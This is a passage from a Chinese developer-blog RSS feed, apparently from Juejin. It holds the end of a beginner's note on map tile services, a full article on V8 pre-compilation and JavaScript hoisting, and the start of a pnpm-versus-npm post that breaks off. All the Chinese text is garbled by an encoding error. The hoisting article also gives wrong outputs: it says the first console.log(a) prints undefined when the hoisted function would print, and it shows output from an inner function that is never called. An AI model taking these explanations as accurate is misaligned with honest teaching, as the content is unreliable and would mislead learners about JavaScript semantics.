<li><strong>åˆ‡å›¾è§„åˆ™</strong>ï¼šç†è§£ <code>y</code> å’Œ <code>reverseY</code> çš„åŒºåˆ«ï¼Œæ­£ç¡®é€‰æ‹©åˆ‡å›¾è§„åˆ™</li>
<li><strong>å‚æ•°é…ç½®</strong>ï¼šäº†è§£å„ç§æœåŠ¡çš„å‚æ•°å«ä¹‰å’Œé…ç½®æ–¹æ³•</li>
</ol>
<p><strong>æˆ‘çš„æ„Ÿå—</strong>ï¼šæ ‡å‡†åœ°å›¾æœåŠ¡è™½ç„¶é…ç½®æœ‰ç‚¹å¤æ‚ï¼Œä½†æ˜¯ç”¨èµ·æ¥å…¶å®ä¸éš¾ã€‚å…³é”®æ˜¯è¦ç†è§£ä¸åŒæœåŠ¡çš„ç‰¹ç‚¹ï¼Œç„¶åæ­£ç¡®é…ç½®å‚æ•°å’Œåˆ‡å›¾è§„åˆ™ï¼</p>
<p><strong>ä¸‹ä¸€æ­¥è®¡åˆ’</strong>ï¼š</p>
<ol>
<li>å­¦ä¹ æ›´å¤šåœ°å›¾æœåŠ¡çš„é…ç½®é€‰é¡¹</li>
<li>å°è¯•åˆ›å»ºè‡ªå®šä¹‰çš„ç“¦ç‰‡æœåŠ¡</li>
<li>åšä¸€ä¸ªå®Œæ•´çš„åœ°å›¾å±•ç¤ºé¡¹ç›®</li>
</ol>
<hr/>
<blockquote>
<p>å­¦ä¹ ç¬”è®°å°±åˆ°è¿™é‡Œå•¦ï¼ä½œä¸ºä¸€ä¸ªåˆå­¦è€…ï¼Œæˆ‘è§‰å¾—æ ‡å‡†åœ°å›¾æœåŠ¡è™½ç„¶é…ç½®æœ‰ç‚¹å¤æ‚ï¼Œä½†æ˜¯ç”¨èµ·æ¥å…¶å®ä¸éš¾ã€‚å…³é”®æ˜¯è¦ç†è§£ä¸åŒæœåŠ¡çš„ç‰¹ç‚¹ï¼Œç„¶åæ­£ç¡®é…ç½®å‚æ•°å’Œåˆ‡å›¾è§„åˆ™ï¼å¸Œæœ›æˆ‘çš„ç¬”è®°èƒ½å¸®åˆ°å…¶ä»–åˆå­¦è€…ï¼å¤§å®¶ä¸€èµ·åŠ æ²¹ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[éœ‡æƒŠï¼šv8å¼•æ“ç«Ÿæ˜¯å¦‚æ­¤æ“ä½œä»£ç ï¼ˆJSé¢„ç¼–è¯‘ï¼‰]]></title>    <link>https://juejin.cn/post/7582156410320486410</link>    <guid>https://juejin.cn/post/7582156410320486410</guid>    <pubDate>2025-12-11T08:13:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582156410320486410" data-draft-id="7582231988146208819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="éœ‡æƒŠï¼šv8å¼•æ“ç«Ÿæ˜¯å¦‚æ­¤æ“ä½œä»£ç ï¼ˆJSé¢„ç¼–è¯‘ï¼‰"/> <meta itemprop="keywords" content="JavaScript,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-11T08:13:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¸¡è…¿å¤§ç‹"/> <meta itemprop="url" content="https://juejin.cn/user/4361104734828352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            éœ‡æƒŠï¼šv8å¼•æ“ç«Ÿæ˜¯å¦‚æ­¤æ“ä½œä»£ç ï¼ˆJSé¢„ç¼–è¯‘ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4361104734828352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¸¡è…¿å¤§ç‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:13:00.000Z" title="Thu Dec 11 2025 08:13:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>JavaScript çš„æ‰§è¡Œæµç¨‹åŒ…å«äº†ç¼–è¯‘é˜¶æ®µå’Œæ‰§è¡Œé˜¶æ®µï¼Œç†è§£è¿™ä¸¤è€…å¯¹äºæŒæ¡ JavaScript çš„å·¥ä½œåŸç†è‡³å…³é‡è¦ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†é€šè¿‡ V8 å¼•æ“å¦‚ä½•æ‰§è¡Œä»£ç çš„å…·ä½“ç¤ºä¾‹ï¼Œæ¥å¸®åŠ©ä½ æ¸…æ™°åœ°ç†è§£ç¼–è¯‘å’Œæ‰§è¡Œçš„å…ˆåé¡ºåºï¼Œç‰¹åˆ«æ˜¯å¦‚ä½•è¿›è¡Œé¢„ç¼–è¯‘ï¼ˆHoistingï¼‰æ“ä½œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/576eaf6b660b43c5a129039c16314c7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bih6IW_5aSn546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766045580&amp;x-signature=SpZpjAEHlTgYiUQ6DDbKpiR%2Fg5U%3D" alt="05CF44C8.jpg" loading="lazy"/></p>
<h2 data-id="heading-0">1. V8 å¼•æ“çš„ç¼–è¯‘ä¸æ‰§è¡Œæµç¨‹</h2>
<p>V8 å¼•æ“çš„å·¥ä½œåˆ†ä¸ºä¸¤ä¸ªä¸»è¦é˜¶æ®µï¼š</p>
<ul>
<li><strong>ç¼–è¯‘é˜¶æ®µ</strong>ï¼šV8 é¦–å…ˆå°† JavaScript ä»£ç è§£ææˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œå¹¶è¿›è¡Œå³æ—¶ç¼–è¯‘ï¼ˆJITï¼‰è½¬æ¢ä¸ºæœºå™¨ç ã€‚è¿™ä¸€é˜¶æ®µä¸»è¦æ˜¯ä¸ºæ‰§è¡Œä»£ç åšå‡†å¤‡ã€‚</li>
<li><strong>æ‰§è¡Œé˜¶æ®µ</strong>ï¼šåœ¨å­—èŠ‚ç æˆ–æœºå™¨ç ç”Ÿæˆåï¼ŒV8 å¼€å§‹æ‰§è¡Œ JavaScript ä»£ç ã€‚åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠåˆ°å˜é‡å’Œå‡½æ•°çš„èµ‹å€¼ã€è°ƒç”¨ç­‰ã€‚</li>
</ul>
<h2 data-id="heading-1">2. ä½œç”¨åŸŸæå‡ï¼ˆHoistingï¼‰</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f4d3d751c7e42b889dd3456841d12d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bih6IW_5aSn546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766045580&amp;x-signature=2xxUtNDfObMtSNb2r9wZKD8bM%2BM%3D" alt="05D0F363.gif" loading="lazy"/>
<strong>ä½œç”¨åŸŸæå‡</strong>æ˜¯æŒ‡åœ¨ç¼–è¯‘é˜¶æ®µï¼ŒJavaScript ä¼šå°†å˜é‡å£°æ˜ï¼ˆ<code>var</code>ï¼‰å’Œå‡½æ•°å£°æ˜æå‰åˆ°å½“å‰ä½œç”¨åŸŸçš„é¡¶éƒ¨ã€‚è¿™æ„å‘³ç€ï¼Œåœ¨ä»£ç æ‰§è¡Œä¹‹å‰ï¼ŒJavaScript å·²ç»çŸ¥é“äº†å˜é‡å’Œå‡½æ•°çš„åå­—ï¼Œä½†æœªåˆå§‹åŒ–çš„å˜é‡ä¼šè¢«èµ‹å€¼ä¸º <code>undefined</code>ï¼Œå‡½æ•°ä¼šç›´æ¥æŒ‡å‘å‡½æ•°ä½“ã€‚</p>
<p>ä¸‹é¢çš„ä»£ç å±•ç¤ºäº†è¿™ä¸€è¿‡ç¨‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);  <span class="hljs-comment">// undefined</span>
  <span class="hljs-keyword">var</span> a = <span class="hljs-number">123</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);  <span class="hljs-comment">// 123</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"/>) {}
  <span class="hljs-keyword">var</span> b = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {};
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);  <span class="hljs-comment">// function() {}</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">c</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> c = a;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c);  <span class="hljs-comment">// 123</span>
  }
}
<span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>);
</code></pre>
<h3 data-id="heading-2">è§£é‡Šï¼š</h3>
<ul>
<li><strong>æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆExecution Contextï¼‰</strong> ï¼šå½“ <code>fn</code> è¢«è°ƒç”¨æ—¶ï¼ŒV8 å¼•æ“ä¼šä¸ºè¯¥å‡½æ•°åˆ›å»ºä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆECï¼‰ã€‚åœ¨å‡½æ•°è¢«ç¼–è¯‘æ—¶ï¼Œ<code>a</code>ã€<code>b</code> å’Œ <code>c</code> ç­‰å˜é‡å’Œå‡½æ•°ä¼šè¢«æå‡åˆ°å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡çš„é¡¶éƒ¨ã€‚</li>
<li><strong>AOï¼ˆActivation Objectï¼‰</strong> ï¼š<code>fn</code> å‡½æ•°å†…çš„æ‰€æœ‰å£°æ˜ï¼ˆå¦‚å˜é‡å’Œå‡½æ•°ï¼‰ä¼šè¢«å­˜å‚¨åœ¨ AO å¯¹è±¡ä¸­ã€‚å›¾ä¸­çš„æ³¨é‡Šéƒ¨åˆ†å±•ç¤ºäº†å‡½æ•°ä½“è¢«é¢„ç¼–è¯‘åçš„ AO ç»“æ„ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable constant_">AO</span> = {
  <span class="hljs-attr">a</span>: <span class="hljs-literal">undefined</span>,  <span class="hljs-comment">// å‡½æ•° a è¢«æå‡ï¼Œä½†è¢«åˆå§‹åŒ–ä¸º undefined</span>
  <span class="hljs-attr">b</span>: <span class="hljs-literal">undefined</span>,  <span class="hljs-comment">// å˜é‡ b è¢«æå‡</span>
  <span class="hljs-attr">c</span>: <span class="hljs-literal">undefined</span>   <span class="hljs-comment">// å‡½æ•° c è¢«æå‡</span>
}

</code></pre>
<h3 data-id="heading-3">ä»£ç è¡Œä¸ºåˆ†æï¼š</h3>
<ol>
<li>å½“è°ƒç”¨ <code>fn(1)</code> æ—¶ï¼Œ<code>a</code> ä½œä¸ºå½¢å‚è¢«ä¼ å…¥å€¼ <code>1</code>ã€‚åœ¨å‡½æ•°ä½“å†…ï¼Œ<code>a</code> ä¼šè¢«æå‡å¹¶åˆå§‹åŒ–ä¸º <code>undefined</code>ã€‚</li>
<li>ç¬¬ä¸€ä¸ª <code>console.log(a)</code> è¾“å‡ºçš„æ˜¯ <code>undefined</code>ï¼Œå› ä¸ºå˜é‡ <code>a</code> å·²ç»è¢«æå‡ï¼Œä½†æ²¡æœ‰è¢«èµ‹å€¼ã€‚</li>
<li>ä¹‹åï¼Œ<code>var a = 123;</code> ä¼šå°† <code>a</code> çš„å€¼æ›´æ–°ä¸º <code>123</code>ï¼Œç¬¬äºŒä¸ª <code>console.log(a)</code> è¾“å‡º <code>123</code>ã€‚</li>
<li><code>function a()</code> è¢«æå‡å¹¶è¦†ç›–äº† <code>var a</code> çš„å€¼ï¼Œä½†ç”±äºå‡½æ•°å£°æ˜åœ¨æ‰§è¡Œæ—¶å‘ç”Ÿä½œç”¨ï¼Œæ‰€ä»¥å¯¹ <code>a</code> çš„å€¼ä¸ä¼šæœ‰å½±å“ã€‚</li>
<li><code>console.log(b)</code> è¾“å‡º <code>function() {}</code>ï¼Œå› ä¸º <code>b</code> è¢«å®šä¹‰ä¸ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸”å‡½æ•°å£°æ˜ä¼šåœ¨ç¼–è¯‘æ—¶æå‡ã€‚</li>
<li><code>console.log(c)</code> è¾“å‡º <code>123</code>ï¼Œè¿™æ˜¯å› ä¸º <code>c</code> è¢«å®šä¹‰ä¸ºæŒ‡å‘ <code>a</code>ï¼Œè€Œ <code>a</code> åœ¨å‡½æ•°å†…éƒ¨çš„å€¼æ˜¯ <code>123</code>ã€‚</li>
</ol>
<h2 data-id="heading-4">3. å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ä¸å±€éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb649d582b1045608c5c255b3d65b5ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bih6IW_5aSn546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766045580&amp;x-signature=XnTsKshZzzRE4JU4MDtrtzqRWK4%3D" alt="05D0BC45.gif" loading="lazy"/>
é™¤äº†å‡½æ•°å†…éƒ¨çš„æ‰§è¡Œä¸Šä¸‹æ–‡å¤–ï¼Œå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ä¹Ÿéµå¾ªç›¸åŒçš„ç¼–è¯‘ä¸æ‰§è¡Œè§„åˆ™ã€‚å…¨å±€ä¸Šä¸‹æ–‡åˆ›å»ºæ—¶ï¼ŒV8 å¼•æ“ä¼šåˆ›å»ºä¸€ä¸ª <strong>å…¨å±€å¯¹è±¡</strong>ï¼ˆå¦‚ <code>window</code> æˆ– <code>global</code>ï¼‰ï¼Œå¹¶å°†å…¨å±€å˜é‡å’Œå‡½æ•°å£°æ˜æå‡åˆ°è¯¥å¯¹è±¡ä¸Šã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> a = <span class="hljs-number">10</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);  <span class="hljs-comment">// undefined</span>
  <span class="hljs-keyword">var</span> a = <span class="hljs-number">20</span>;
}
<span class="hljs-title function_">foo</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);  <span class="hljs-comment">// 10</span>

</code></pre>
<h3 data-id="heading-5">è§£é‡Šï¼š</h3>
<ul>
<li>åœ¨å…¨å±€ä½œç”¨åŸŸï¼Œ<code>var a</code> è¢«æå‡ï¼Œåˆå§‹åŒ–ä¸º <code>undefined</code>ã€‚</li>
<li>åœ¨ <code>foo</code> å‡½æ•°å†…ï¼Œ<code>var a</code> åŒæ ·ä¼šè¢«æå‡ï¼Œåˆå§‹åŒ–ä¸º <code>undefined</code>ã€‚å› æ­¤ï¼Œå‡½æ•°å†…çš„ <code>console.log(a)</code> è¾“å‡º <code>undefined</code>ã€‚</li>
<li>æœ€åï¼Œ<code>console.log(a)</code> è¾“å‡ºçš„æ˜¯å…¨å±€ä½œç”¨åŸŸä¸­çš„ <code>a</code>ï¼Œå…¶å€¼ä¸º <code>10</code>ã€‚</li>
</ul>
<h2 data-id="heading-6">4. æ€»ç»“</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bfe800d8604d46698f85035a6139d365~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bih6IW_5aSn546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766045580&amp;x-signature=rLFO%2FPqDv3XpNfAF0Cnnbacf7WM%3D" alt="05D1BC60.jpg" loading="lazy"/>
é€šè¿‡ä¸Šè¿°ä»£ç ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° V8 å¼•æ“å¦‚ä½•åœ¨ç¼–è¯‘é˜¶æ®µè¿›è¡Œä½œç”¨åŸŸæå‡ï¼Œå¹¶é€šè¿‡æ‰§è¡Œä¸Šä¸‹æ–‡ç®¡ç†å˜é‡å’Œå‡½æ•°çš„å£°æ˜ã€‚ç†è§£è¿™ä¸ªè¿‡ç¨‹ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°æŒæ¡ JavaScript çš„æ‰§è¡Œé¡ºåºå’Œä½œç”¨åŸŸè§„åˆ™ã€‚</p>
<h3 data-id="heading-7">ä¸»è¦è¦ç‚¹ï¼š</h3>
<ul>
<li><strong>ç¼–è¯‘ä¸æ‰§è¡Œ</strong>ï¼šV8 å¼•æ“é¦–å…ˆç¼–è¯‘ä»£ç ï¼Œå†æ‰§è¡Œå­—èŠ‚ç ã€‚</li>
<li><strong>ä½œç”¨åŸŸæå‡ï¼ˆHoistingï¼‰</strong> ï¼šå˜é‡å’Œå‡½æ•°å£°æ˜ä¼šè¢«æå‡ï¼Œä½†èµ‹å€¼ä¼šæŒ‰é¡ºåºæ‰§è¡Œã€‚</li>
<li><strong>æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆECï¼‰</strong> ï¼šæ¯ä¸ªå‡½æ•°çš„æ‰§è¡Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå¹¶åœ¨ç¼–è¯‘é˜¶æ®µå®Œæˆé¢„ç¼–è¯‘ï¼ˆæå‡ï¼‰ã€‚</li>
<li><strong>å…¨å±€ä¸å±€éƒ¨ä½œç”¨åŸŸ</strong>ï¼šå…¨å±€ä½œç”¨åŸŸå’Œå±€éƒ¨ä½œç”¨åŸŸä¼šæœ‰ä¸åŒçš„æå‡è§„åˆ™ï¼Œä½†åŸºæœ¬éµå¾ªç›¸åŒçš„åŸç†ã€‚</li>
</ul>
<p>é€šè¿‡æŒæ¡è¿™äº›åŸºç¡€çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥æ›´è½»æ¾åœ°ç†è§£ JavaScript ä»£ç çš„æ‰§è¡Œé¡ºåºï¼Œå¹¶é¿å…ä¸€äº›æ½œåœ¨çš„é™·é˜±ï¼Œå¥½çš„å§å¦¹ä»¬ï¼Œå’±ä»¬ä¸‹æœŸå†è§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7e119b7e32245e8b13d6b5b65ad1fc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bih6IW_5aSn546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766045580&amp;x-signature=9%2B7%2FFYVLhqg45fcCkvArD44Z5cE%3D" alt="05D26513.jpg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[pnpmå’Œnpmå¯¹æ¯”ï¼Œä¸ºä»€ä¹ˆç°åœ¨æ›´å¤šé¡¹ç›®ä½¿ç”¨pnpmè¿è¡Œé¡¹ç›®]]></title>    <link>https://juejin.cn/post/7582231988146520115</link>    <guid>https://juejin.cn/post/7582231988146520115</guid>    <pubDate>2025-12-11T08:14:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582231988146520115" data-draft-id="7582156410320470026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="pnpmå’Œnpmå¯¹æ¯”ï¼Œä¸ºä»€ä¹ˆç°åœ¨æ›´å¤šé¡¹ç›®ä½¿ç”¨pnpmè¿è¡Œé¡¹ç›®"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-11T08:14:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="whisper"/> <meta itemprop="url" content="https://juejin.cn/user/2814366169706040"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            pnpmå’Œnpmå¯¹æ¯”ï¼Œä¸ºä»€ä¹ˆç°åœ¨æ›´å¤šé¡¹ç›®ä½¿ç”¨pnpmè¿è¡Œé¡¹ç›®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2814366169706040/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    whisper
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:14:52.000Z" title="Thu Dec 11 2025 08:14:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
